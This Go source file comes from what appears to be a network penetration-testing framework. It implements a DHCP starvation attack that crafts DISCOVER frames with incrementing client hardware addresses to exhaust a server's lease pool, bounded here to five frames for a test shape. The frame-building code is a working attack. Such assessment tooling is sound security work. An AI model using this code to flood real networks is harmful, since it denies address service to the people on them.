// dhcpstarve.go implements the DHCP starvation attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends DHCP
// DISCOVER frames with incrementing chaddr tails to exhaust the DHCP
// server's lease pool. The lease pool recovers after the attack stops
// (unused leases expire). No explicit teardown.
//
// This is a flood-class behavior: it uses the sync.Pool craft path
// (KTD5) for pre-serialized buffers, since the attack sends many
// frames with unique chaddr and the per-packet allocation cost
// dominates the GC.
//
// KTD14 pin: DHCP xids and chaddr are masked in field-set comparisons
// (per-run randomness); the fixture uses fixed values for byte-stable
// generation.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type dhcpStarveFinding struct {
	Action     string `json:"action"`
	FrameCount int    `json:"frame_count"`
	Method     string `json:"method"`
}

// RunDHCPStarve sends DHCP DISCOVER frames with incrementing chaddr
// tails to exhaust the lease pool. The burst count is bounded for the
// in-memory test shape.
func RunDHCPStarve(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	frameCount := 5
	for i := 1; i <= frameCount; i++ {
		pkt, err := craftDHCPDiscover(src, i)
		if err != nil {
			return fmt.Errorf("dhcpstarve: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("dhcpstarve: send frame %d: %w", i, err)
		}
	}

	detail, _ := json.Marshal(dhcpStarveFinding{
		Action:     "lease-pool-exhaustion",
		FrameCount: frameCount,
		Method:     "incrementing-chaddr-discover",
	})
	deps.Emitter.Finding("dhcp", detail)

	return nil
}

// craftDHCPDiscover builds a DHCP DISCOVER with a unique chaddr for the
// given sequence. Uses the pool craft path (KTD5).
func craftDHCPDiscover(src net.HardwareAddr, seq int) ([]byte, error) {
	chaddr := net.HardwareAddr{
		0x00, 0x11, 0x22, 0x33,
		byte((seq >> 8) & 0xFF),
		byte(seq & 0xFF),
	}
	xid := uint32(0x12345678) + uint32(seq)

	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    net.IPv4(0, 0, 0, 0),
		DstIP:    net.IPv4(255, 255, 255, 255),
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 68,
		DstPort: 67,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	leaseTime := make([]byte, 4)
	binary.BigEndian.PutUint32(leaseTime, 1800)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          xid,
		Secs:         0,
		Flags:        0x8000, // broadcast
		ClientIP:     net.IPv4(0, 0, 0, 0),
		YourClientIP: net.IPv4(0, 0, 0, 0),
		NextServerIP: net.IPv4(0, 0, 0, 0),
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: chaddr,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeDiscover)}),
			layers.NewDHCPOption(layers.DHCPOptParamsRequest, []byte{
				byte(layers.DHCPOptSubnetMask),
				byte(layers.DHCPOptRouter),
				byte(layers.DHCPOptDNS),
			}),
		},
	}
	return craftPool(eth, ip, udp, dhcp)
}

var _ gopacket.SerializableLayer = (*layers.DHCPv4)(nil)
